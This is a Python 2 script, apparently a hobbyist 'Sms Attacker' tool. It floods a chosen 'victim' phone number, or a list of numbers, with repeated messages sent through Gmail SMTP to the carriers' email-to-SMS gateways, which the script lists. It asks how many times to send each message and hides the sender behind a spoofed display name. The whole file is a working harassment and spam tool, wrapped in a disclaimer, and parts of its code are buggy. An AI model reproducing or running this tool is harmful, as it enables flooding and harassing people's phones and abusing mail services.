#!/usr/bin/env python
#I must say if you are looking at the code, any changes you make, i am not responsible for the outcome.
#If it stops working because you have changed it, you can contact me at github, but do not blame me
#by reading this and opening the file you acknowledge i am not responsible for how you use this.
# but I implore you to not use this illegally
import random
import string
import smtplib
import os
from time import sleep
from getpass import getpass
from subprocess import call

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'

W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan  

def clear():
	os.system('clear')
	
def msms():
	clear()
	print ""+G+" "
	print """
	[+]======================[+]
	[!] Mass List SMS Attack:[!]
	[+]======================[+]
	When creating the file list, remember to attach the carrier to the end of each number.
	[+] example. 4567834214@txt.att.net[+]
	here is a list of the different carrier types.
	You can look them up also at online if theres a new one.
	"AT&T: @txt.att.net"
	"Qwest: @tmomail.net"
	"T-Mobile: @tmomail.net"
	"Verizon: @vtext.com"
	"Sprint: @messaging.sprintpcs.com or @pm.sprint.com"
	"Virgin Mobile: @vmobl.com "
	"Nextel: @messaging.nextel.com"
	"Alltel: @message.alltel.com"
	"Metro PCS: @mymetropcs.com"
	"Powertel: @ptel.com"
	"Boost Mobile: @myboostmobile.com"
	"Suncom: @tms.suncom.com"
	"tracfone: @mmst5.tracfone.com"
	"U.S Cellular: @email.uscc.net"
	"Put the @ sign before the provider"
	"""

        print ""+T+" "
	phonelst = raw_input(color.UNDERLINE + 'Path to victem list' + color.END) 
	phonelst = open(phonelst, 'rb')
        print ""+T+" "
	gmail = raw_input(color.UNDERLINE + 'Your email>' + color.END)
        print ""+T+" "
        fromname = '.' + ' ' + raw_input(color.UNDERLINE + 'Name of the user you want target to see' + color.END)
        print ""+T+" "
	password = getpass(color.UNDERLINE + 'Password>' + color.END)
        o = smtplib.SMTP("smtp.gmail.com:587")
        o.starttls()
        o.login(gmail, password)

	message = raw_input(color.UNDERLINE + 'Message>' + color.END)
        print ""+T+" "
	counter = input(color.UNDERLINE + 'How many times>' + color.END)
        print ""+T+" "
	for phone in phonelst:
		try:
			spam_msg = "From: {} \r\nTo: {} \r\n\r\n {}".format(fromname, phone, message)
			print (color.UNDERLINE + ''+G+'[*] Sending...' + color.END)
			for i in range(counter):
			    o.sendmail(fromname, phone, spam_msg)
			sleep(0.01)
			print(phone)
			print (color.UNDERLINE + ''+G+'[*] Successfully sent' + color.END)
			
	#someone please tell me why the except happens after try succesfully does it's job?
		except:
			print("done")
			b = raw_input("press enter to continue")
			menu()
			
def ssms():
	clear()
	print ""+B+" "
	print ("""
	[+]==========================================[+]
	[+]Single SMS Attack-------------------------[+]
	[+]==========================================[+]
	
	"AT&T: @txt.att.net"
	"Qwest: @tmomail.net"
	"T-Mobile: @tmomail.net"
	"Verizon: @vtext.com"
	"Sprint: @messaging.sprintpcs.com or @pm.sprint.com"
	"Virgin Mobile: @vmobl.com "
	"Nextel: @messaging.nextel.com"
	"Alltel: @message.alltel.com"
	"Metro PCS: @mymetropcs.com"
	"Powertel: @ptel.com"
	"Boost Mobile: @myboostmobile.com"
	"Suncom: @tms.suncom.com"
	"tracfone: @mmst5.tracfone.com"
	"U.S Cellular: @email.uscc.net"
	"Put the @ sign before the provider"
	""")
	
	provider = raw_input(color.UNDERLINE + 'Enter cellular provider>' + color.END)
        print ""+T+" "
	phone_num = raw_input(color.UNDERLINE + 'Victims phone number>' + color.END) + provider
        print ""+T+" "
	gmail = raw_input(color.UNDERLINE + 'Your email>' + color.END)
        print ""+T+" "
	password = getpass(color.UNDERLINE + 'Password>' + color.END)
	fromname = '.' + ' ' + raw_input(color.UNDERLINE + 'Name of the user you want target to see' + color.END)
	print ("This function should make your message anonymous, unless google fixes the this flaw")

        o = smtplib.SMTP("smtp.gmail.com:587")
        o.starttls()
        o.login(gmail, password)
        
	print ""+T+" "
	message = raw_input(color.UNDERLINE + 'Message>' + color.END)
        print ""+T+" "
	counter = input(color.UNDERLINE + 'How many times>' + color.END)
        print ""+T+" "
        spam_msg = "From: {} \r\nTo: {} \r\n\r\n {}".format(fromname, phone_num, message)
	print (color.UNDERLINE + ''+G+'[*] Sending...' + color.END)
        for i in range(counter):
            o.sendmail(gmail, phone_num, spam_msg)
        sleep(0.004)
        print(phone)
	print (color.UNDERLINE + ''+G+'[*] Successfully sent' + color.END)
	
def menu():
	clear()
	print ""+O+" "
	print ("""
		[+]==============================[+]
		[+]::::::::Sms Attacker::::::::::[+]
		[+]==============================[+]
		+++++++++++++++++++++++++++++++++++++++}
		[!]------------------------------------}
		[!]----====-------=----=-----====------}
		[!]---=----------=-=--=-=---=----------}
		[!]---=---------=---==---=--=----------}
		[!]----====----=----==----=--====------}
		[!]--------=---=-----=----=------=-----}
		[!]--------=---=----=-----=------=-----}
		[!]----====----=-----=----=--====------}
		+++++++++++++++++++++++++++++++++++++++}
		========================================
		Created and Designed by Andrew El+++++++
		========================================
		***********By Chosing an option*********
		You recognize and accept the disclaimer+
		I am not responsible how you use this 
		software. take great care in using it...
		""")
	print ""+P+" "
	print ("""
		+++++++++++++++++++++++++++++++++++++++++++
		this sms attack will send spam anonomoously
		(whatever you choose) to target as many times
		you type in.
		++++++++++++++++++++++++++++++++++++++++++++
		options: s=single target m=mass email list
		++++++++++++++++++++++++++++++++++++++++++++
		**************lowercase*********************
		""")
	print ""+C+" "	
	option = raw_input("option:")
	if option == "s":
		clear()
		ssms()
	elif option == "m":
		clear()
		msms()
	else:
		clear()
		print ""+R+" "
		print ("sorry just type in lowercase 's' or 'm' only ")
		p = raw_input("Press enter to continue")	
		menu()	
			
			
			
menu()	

		
